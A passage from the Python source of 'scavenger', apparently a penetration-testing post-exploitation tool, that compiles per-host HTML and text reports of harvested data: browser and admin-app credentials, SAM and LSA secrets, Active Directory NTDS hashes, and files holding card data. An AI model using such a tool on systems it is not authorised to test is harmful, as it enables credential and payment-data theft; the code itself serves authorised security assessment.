            if '[+] 0 passwords have been found.' not in r:
                html_list_laz_browsers.append(r)
                laz_browsers_check = True

    laz_sysadmin_check = False

    with db:
        laz_sysadmin = con_db.execute(f"""SELECT ip_address,laz_sysadmin FROM laz_s_smb_latest ORDER BY ip_address""")
        for r in laz_sysadmin:
            if '[+] 0 passwords have been found.' not in r:
                html_list_laz_sysadmin.append(r)
                laz_sysadmin_check = True

    with db:
        sam_hashes_smb = con_db.execute(f"""SELECT ip_address,sam_hashes FROM 'hashes_sam_smb_latest'""")
        for r in sam_hashes_smb:
            html_list_sam_hashes.append(r)

    with db:
        lsa_hashes_smb = con_db.execute(f"""SELECT ip_address,lsa_hashes FROM 'hashes_lsa_smb_latest'""")
        for r in lsa_hashes_smb:
            html_list_lsa_hashes.append(r)

    with db:
        ntds_hashes_smb = con_db.execute(f"""SELECT ip_address,ntds_hashes FROM 'hashes_ntds_smb_latest'""")
        for r in ntds_hashes_smb:
            html_list_ntds_hashes.append(r)

    html_header = """

<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Scavenger Output</title>
  <link rel="stylesheet" href="https://code.jquery.com/ui/1.12.1/themes/base/jquery-ui.css">
  <link rel="stylesheet" href="https://code.jquery.com/ui/resources/demos/style.css">
  <script src="https://code.jquery.com/jquery-1.12.4.js"></script>
  <script src="https://code.jquery.com/ui/1.12.1/jquery-ui.js"></script>
  <script>
  $( function() {
    $( "#accordion" ).accordion({
      collapsible: true,
      //Set the active accodtion tab to none
      active : 'none'
    });
  } );
  </script>
   <style>
  p.a {
      white-space: pre;
  }
  </style>
</head>
<body>
    <p><b><code><p class='a'>scavenger.py v1.0 by Philip Pieterse (@haxrbyte) [https://github.com/SpiderLabs/scavenger]
    ***************************************************
    *  ___  ___ __ ___   _____ _ __   __ _  ___ _ __  *
    * / __|/ __/ _` \ \ / / _ \ '_ \ / _` |/ _ \ '__| *
    * \__ \ (_| (_| |\ V /  __/ | | | (_| |  __/ |    *
    * |___/\___\__,_| \_/ \___|_| |_|\__, |\___|_|    *
    *                                |___/            *
    ***************************************************</b>
    
    scavenger => definition [noun]: a person who searches for and collects discarded items.
    
                    *** Powered and Inspired by ***
    Impacket https://github.com/CoreSecurity/impacket (@agsolino)
    CrackMapExec https://github.com/byt3bl33d3r/CrackMapExec (@byt3bl33d3r)
    ccsrch https://github.com/adamcaudill/ccsrch (@adamcaudill)
    LaZagne https://github.com/AlessandroZ/LaZagne
    </p></code></b></p>
    <div id="accordion">
    """

    closing_html = """
    </div>

</body>
</html>
"""

    closing_html_code = """
            </code></p>
"""

    closing_html_code_div = """
            </code></p>
        </div>
"""

    # now open the file for writing
    with open("results/scavenger-smb.html", 'w') as html_file_builder:
        # begin html file
        html_file_builder.write(html_header)
        for ip, dc_check, mh_check, sh_check, lh_check, nh_check, cc_check, t2_check, laz_b_check, laz_s_check, runas, host_name, os_name, win_dir, sys_dir, domain_name, nr_net in html_list_info:
            with open(f"results/{ip}-scavenger-smb.scav", 'w') as text_file_builder:
                text_file_builder.write("scavenger.py v1.0 by Philip Pieterse (@haxrbyte) [https://github.com/SpiderLabs/scavenger]")
                banner_text = """
        ***************************************************
        *  ___  ___ __ ___   _____ _ __   __ _  ___ _ __  *
        * / __|/ __/ _` \ \ / / _ \ '_ \ / _` |/ _ \ '__| *
        * \__ \ (_| (_| |\ V /  __/ | | | (_| |  __/ |    *
        * |___/\___\__,_| \_/ \___|_| |_|\__, |\___|_|    *
        *                                |___/            *
        ***************************************************
        
"""
                text_file_builder.write(banner_text)
                text_file_builder.write("scavenger => definition [noun]: a person who searches for and collects discarded items.\n")
                text_file_builder.write("*** Powered and Inspired by ***\n")
                text_file_builder.write("Impacket https://github.com/CoreSecurity/impacket (@agsolino)\n")
                text_file_builder.write("CrackMapExec https://github.com/byt3bl33d3r/CrackMapExec (@byt3bl33d3r)\n")
                text_file_builder.write("ccsrch https://github.com/adamcaudill/ccsrch (@adamcaudill)\n")
                text_file_builder.write("LaZagne https://github.com/AlessandroZ/LaZagne\n\n")
                text_file_builder.write(f"=== START => {ip} ===\n")

            html_check = []

            if dc_check:
                html_check.append("Domain Controller")
            if mh_check:
                html_check.append("Multi Homed")

            html_check_compare1 = False
            html_check_compare2 = False
            html_check_int = False
            html_check_lazb = False
            html_check_lazs = False

            if html_check_compare1 or html_check_compare2:
                html_check.append("Unique to Cache")

            if len(html_list_int) > 0:
                html_check.append("Interesting Files")
                html_check_int = True

            if cc_check:
                html_check.append("Card Holder Data")
            if t2_check:
                html_check.append("Track2")
            if laz_browsers_check:
                for ip_l, laz_credsb in html_list_laz_browsers:
                    if ip_l == ip:
                        html_check_lazb = True

            if laz_sysadmin_check:
                for ip_l, laz_credss in html_list_laz_sysadmin:
                    if ip_l == ip:
                        html_check_lazs = True

            if html_check_lazb or html_check_lazs:
                html_check.append("Other Credentials")

            if sh_check:
                html_check.append("SAM Hashes")
            if lh_check:
                html_check.append("LSA Secrets")
            if nh_check:
                html_check.append("AD Hashes")

            html_check_str = " * ".join(html_check)

            html_section_info = f"""
    <h3><b>{ip}</b> ({host_name}) => <font size="2" color="red"><b>{html_check_str}</b></font>
    </h3>
    <div>
        <p><b>Running as user : </b>{runas}</p>
        <p><b>OS Name : </b>{os_name}</p>
        <p><b>Win Directory : </b>{win_dir}</p>
        <p><b>System Directory : </b>{sys_dir}</p>
        <p><b>Domain Name : </b>{domain_name}</p>
        <p><b>Amount of Network Cards : </b>{nr_net}</p>
        <p><b>List of LATEST modified files and folders (newest first) : </b></p>
        <p><code style=display:block;white-space:pre-wrap>"""

            text_section_info = f"""
[+] {ip} ({host_name}) => {html_check_str}

 Running as user : {runas}
 OS Name : {os_name}
 Win Directory : {win_dir}
 System Directory : {sys_dir}
 Domain Name : {domain_name}
 Amount of Network Cards : {nr_net}

[+] List of LATEST modified files and folders (newest first) :
"""
            html_file_builder.write(html_section_info)
            with open(f"results/{ip}-scavenger-smb.scav", 'a') as text_file_builder:
                text_file_builder.write(text_section_info)

            for ip_t, files_t, date_t in html_list_time:
                if ip_t == ip:
                    html_section_time1 = f"""
    {files_t} {date_t}"""
                    text_section_time1 = f"""
 {files_t} {date_t}"""
                    html_file_builder.write(html_section_time1)

                    with open(f"results/{ip}-scavenger-smb.scav", 'a') as text_file_builder:
                        text_file_builder.write(text_section_time1)

            html_section_time2 = f"""
        </code></p>"""
            html_file_builder.write(html_section_time2)
            with open(f"results/{ip}-scavenger-smb.scav", 'a') as text_file_builder:
                text_file_builder.write("\n")

            # Files compare 1
            if html_check_compare1:
                html_section_compare1_1 = f"""
        <p><b>List of file and folder names unique to the LATEST cached list compared to the PREVIOUS cached list (newest first) : </b></p>
        <p><code style=display:block;white-space:pre-wrap>"""
                text_section_compare1_1 = f"""
[+] List of file and folder names unique to the LATEST cached list compared to the PREVIOUS cached list (newest first) :

"""

                html_file_builder.write(html_section_compare1_1)
                with open(f"results/{ip}-scavenger-smb.scav", 'a') as text_file_builder:
                    text_file_builder.write(text_section_compare1_1)

                for ip_c1, files_c1, date_c1 in html_list_compare1:
                    if ip_c1 == ip:
                        html_section_compare1_2 = f"""
    {files_c1} {date_c1}"""
                        text_section_compare1_2 = f"""
 {files_c1} {date_c1}
"""

                        html_file_builder.write(html_section_compare1_2)
                        with open(f"results/{ip}-scavenger-smb.scav", 'a') as text_file_builder:
                            text_file_builder.write(f" {files_c1} {date_c1}\n")

                if html_check_compare2:
                    html_file_builder.write(closing_html_code)
                elif html_check_int:
                    html_file_builder.write(closing_html_code)
                elif cc_check:
                    html_file_builder.write(closing_html_code)
                elif html_check_lazb:
                    html_file_builder.write(closing_html_code)
                elif html_check_lazs:
                    html_file_builder.write(closing_html_code)
                elif sh_check:
                    html_file_builder.write(closing_html_code)
                elif lh_check:
                    html_file_builder.write(closing_html_code)
                elif nh_check:
                    html_file_builder.write(closing_html_code)
                else:
                    html_file_builder.write(closing_html_code_div)

            # Files compare 2
            if html_check_compare2:
                html_section_compare2_1 = f"""
        <p><b>List of file and folder names unique to the PREVIOUS cached list compared to the LATEST cached list (newest first) : </b></p>
        <p><code style=display:block;white-space:pre-wrap>"""
                text_section_compare2_1 = f"""
[+] List of file and folder names unique to the PREVIOUS cached list compared to the LATEST cached list (newest first) :

"""
                html_file_builder.write(html_section_compare2_1)
                with open(f"results/{ip}-scavenger-smb.scav", 'a') as text_file_builder:
                    text_file_builder.write(text_section_compare2_1)

                for ip_c2, files_c2, date_c2 in html_list_compare2:
                    if ip_c2 == ip:
                        html_section_compare2_2 = f"""
    {files_c2} {date_c2}"""
                        text_section_compare2_2 = f"""
 {files_c2} {date_c2}
 """
                        html_file_builder.write(html_section_compare2_2)
                        with open(f"results/{ip}-scavenger-smb.scav", 'a') as text_file_builder:
                            text_file_builder.write(f" {files_c2} {date_c2}\n")

                if html_check_int:
                    html_file_builder.write(closing_html_code)
                elif cc_check:
                    html_file_builder.write(closing_html_code)
                elif html_check_lazb:
                    html_file_builder.write(closing_html_code)
                elif html_check_lazs:
                    html_file_builder.write(closing_html_code)
                elif sh_check:
                    html_file_builder.write(closing_html_code)
                elif lh_check:
                    html_file_builder.write(closing_html_code)
                elif nh_check:
                    html_file_builder.write(closing_html_code)
                else:
                    html_file_builder.write(closing_html_code_div)

            # Files int
            if html_check_int:
                html_section_int1 = f"""
        <p><b>List of file and folder names that match INTERESTING phrases : </b></p>
        <p><code style=display:block;white-space:pre-wrap>"""
                text_section_int1 = f"""
[+] List of file and folder names that match INTERESTING phrases :
"""
                html_file_builder.write(html_section_int1)
                with open(f"results/{ip}-scavenger-smb.scav", 'a') as text_file_builder:
                    text_file_builder.write(text_section_int1)
                files_int_list = []
                for ip_i, files_i in html_list_int:
                    if ip_i == ip:
                        files_int_list.append(files_i)

                files_int_list_u = list(set(files_int_list))
                files_int_list_u.sort()
                for f in files_int_list_u:
                    html_section_int2 = f"""
    {f}"""
                    text_section_int2 = f"""
 {f}
"""
                    html_file_builder.write(html_section_int2)
                #print_debug("text_section_int2", str(text_section_int2.split()))
                    with open(f"results/{ip}-scavenger-smb.scav", 'a') as text_file_builder:
                        text_file_builder.write(f" {f}\n")

                if cc_check:
                    html_file_builder.write(closing_html_code)
                elif html_check_lazb:
                    html_file_builder.write(closing_html_code)
                elif html_check_lazs:
                    html_file_builder.write(closing_html_code)
                elif sh_check:
                    html_file_builder.write(closing_html_code)
                elif lh_check:
                    html_file_builder.write(closing_html_code)
                elif nh_check:
                    html_file_builder.write(closing_html_code)
                else:
                    html_file_builder.write(closing_html_code_div)

            # Credit Card
            if cc_check:
                html_section_credit1 = f"""
        <p><b>List of file names and Card Holder Data : </b></p>
        <p><code style=display:block;white-space:pre-wrap>"""
                text_section_credit1 = f"""
[+] List of file names which contain Card Holder Data :

"""
                html_file_builder.write(html_section_credit1)
                with open(f"results/{ip}-scavenger-smb.scav", 'a') as text_file_builder:
                    text_file_builder.write(text_section_credit1)

                files_cc_list = []
                for ip_credit, files_credit in html_list_credit:
                    if ip_credit == ip:
                        files_cc_list.append(f"{files_credit}")
                files_cc_list_u = list(set(files_cc_list))
                files_cc_list_u.sort()
                for f in files_cc_list_u:


                    html_section_credit2 = f"""
    {f}"""
                    text_section_credit2 = f"""
 {f}
"""
                    html_file_builder.write(html_section_credit2)
                    with open(f"results/{ip}-scavenger-smb.scav", 'a') as text_file_builder:
                        text_file_builder.write(f" {files_credit}\n")

                if html_check_lazb:
                    html_file_builder.write(closing_html_code)
                elif html_check_lazs:
                    html_file_builder.write(closing_html_code)
                elif sh_check:
                    html_file_builder.write(closing_html_code)
                elif lh_check:
                    html_file_builder.write(closing_html_code)
                elif nh_check:
                    html_file_builder.write(closing_html_code)
                else:
                    html_file_builder.write(closing_html_code_div)

            # Laz B
            if html_check_lazb:
                html_section_lazb1 = f"""
        <p><b>Saved Credentials in browsers obtained : </b></p>
        <p><code style=display:block;white-space:pre-wrap>"""
                text_section_lazb1 = f"""
[+] Saved Credentials in browsers obtained :
"""
                html_file_builder.write(html_section_lazb1)
                with open(f"results/{ip}-scavenger-smb.scav", 'a') as text_file_builder:
                    text_file_builder.write(text_section_lazb1)
                for ip_lazb, lazb_found in html_list_laz_browsers:
                    if ip_lazb == ip:
                            # print_debug('lazb_found', lazb_found)
                        html_section_lazb2 = f"""
    {lazb_found}"""
                        text_section_lazb2 = f"""
 {lazb_found}
"""
                        html_file_builder.write(html_section_lazb2)
                        with open(f"results/{ip}-scavenger-smb.scav", 'a') as text_file_builder:
                            text_file_builder.write(f" {lazb_found}\n")

                if html_check_lazs:
                    html_file_builder.write(closing_html_code)
                elif sh_check:
                    html_file_builder.write(closing_html_code)
                elif lh_check:
                    html_file_builder.write(closing_html_code)
                elif nh_check:
                    html_file_builder.write(closing_html_code)
                else:
                    html_file_builder.write(closing_html_code_div)

            # Laz S
            if html_check_lazs:
                html_section_lazs1 = f"""
        <p><b>Saved Credentials in systems admin type apps obtained : </b></p>
        <p><code style=display:block;white-space:pre-wrap>"""
                text_section_lazs1 = f"""
[+] Saved Credentials in systems admin type apps obtained :
"""
                html_file_builder.write(html_section_lazs1)
                with open(f"results/{ip}-scavenger-smb.scav", 'a') as text_file_builder:
                    text_file_builder.write(text_section_lazs1)
                for ip_lazs, lazs_found in html_list_laz_sysadmin:
                    if ip_lazs == ip:
                        html_section_lazs2 = f"""
    {lazs_found}"""
                        text_section_lazs2 = f"""
 {lazs_found}
"""
                        html_file_builder.write(html_section_lazs2)
                        with open(f"results/{ip}-scavenger-smb.scav", 'a') as text_file_builder:
                            text_file_builder.write(f" {lazs_found}\n")

                if html_check_lazs:
                    html_file_builder.write(closing_html_code)
                elif lh_check:
                    html_file_builder.write(closing_html_code)
                elif nh_check:
                    html_file_builder.write(closing_html_code)
                else:
                    html_file_builder.write(closing_html_code_div)

            # SAM Hashes
            if sh_check:
                html_section_hash1_1 = f"""
        <p><b>Local SAM Hashes : </b></p>
        <p><code style=display:block;white-space:pre-wrap>"""
                text_section_hash1_1 = f"""
[+] Local SAM Hashes :

"""
                html_file_builder.write(html_section_hash1_1)
                with open(f"results/{ip}-scavenger-smb.scav", 'a') as text_file_builder:
                    text_file_builder.write(text_section_hash1_1)
                for ip_hashs, hashs in html_list_sam_hashes:
                    if ip_hashs == ip:
                        html_section_hash1_2 = f"""
    {hashs}"""
                        text_section_hash1_2 = f"""
 {hashs}
"""
                        html_file_builder.write(html_section_hash1_2)
                        with open(f"results/{ip}-scavenger-smb.scav", 'a') as text_file_builder:
                            text_file_builder.write(f" {hashs}\n")

                if lh_check:
                    html_file_builder.write(closing_html_code)
                elif nh_check:
                    html_file_builder.write(closing_html_code)
                else:
                    html_file_builder.write(closing_html_code_div)

            # LSA Secrets
            if lh_check:
                html_section_hash2_1 = f"""
        <p><b>LSA Secrets : </b></p>
        <p><code style=display:block;white-space:pre-wrap>"""
                text_section_hash2_1 = f"""
[+] LSA Secrets :
    
"""
                html_file_builder.write(html_section_hash2_1)
                with open(f"results/{ip}-scavenger-smb.scav", 'a') as text_file_builder:
                    text_file_builder.write(text_section_hash2_1)
                for ip_hashl, hashl in html_list_lsa_hashes:
                    if ip_hashl == ip:
                        html_section_hash2_2 = f"""
    {hashl}"""
                        text_section_hash2_2 = f"""
 {hashl}
"""
                        html_file_builder.write(html_section_hash2_2)
                        with open(f"results/{ip}-scavenger-smb.scav", 'a') as text_file_builder:
                            text_file_builder.write(f" {hashl}\n")
                html_section_hash2_3 = f"""
            </code></p>"""
                if nh_check:
                    html_file_builder.write(closing_html_code)
                else:
                    html_file_builder.write(closing_html_code_div)


            # AD Hashes
            if nh_check:
                html_section_hash3_1 = f"""
        <p><b>Active Directory Hashes : </b></p>
        <p><code style=display:block;white-space:pre-wrap>"""
                text_section_hash3_1 = f"""
[+] Active Directory Hashes :
    
"""
                html_file_builder.write(html_section_hash3_1)
                with open(f"results/{ip}-scavenger-smb.scav", 'a') as text_file_builder:
                    text_file_builder.write(text_section_hash3_1)
                for ip_hashn, hashn in html_list_ntds_hashes:
                    if ip_hashn == ip:
                        html_section_hash3_2 = f"""
    {hashn}"""
                        text_section_hash3_2 = f"""
 {hashn}
"""
                        html_file_builder.write(html_section_hash3_2)
                        with open(f"results/{ip}-scavenger-smb.scav", 'a') as text_file_builder:
                            text_file_builder.write(f" {hashn}\n")
                html_file_builder.write(closing_html_code_div)
            with open(f"results/{ip}-scavenger-smb.scav", 'a') as textfile_builder:
                textfile_builder.write(f"\n=== END => {ip} ===\n")

        # end html file
        html_file_builder.write(closing_html)

    printing('10.0.0.100', f"\n*** SCAVENGING ENDED ***\n", color='gray')

    return

if __name__ == '__main__':
    signal(SIGINT, signal_handler)
    main()
